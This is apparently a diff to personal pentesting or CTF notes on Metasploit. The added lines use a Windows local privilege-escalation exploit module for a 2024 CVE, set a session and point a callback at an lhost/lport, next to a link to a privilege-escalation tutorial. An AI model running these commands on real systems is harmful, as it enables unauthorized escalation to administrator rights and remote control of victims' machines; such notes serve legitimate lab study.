@@ -14,7 +14,11 @@
         msf> set session 1
         msf> set validatearch false # без этого у меня не заработало
         msf> run
-
+ 
+use exploit/windows/local/cve_2024_30088_authz_basep
+msf> set session 1
+msf> set lhost tun0
+msf> set lport 4244
 
         
         https://0xma.github.io/hacking/metasploit_privilege_escalation.html
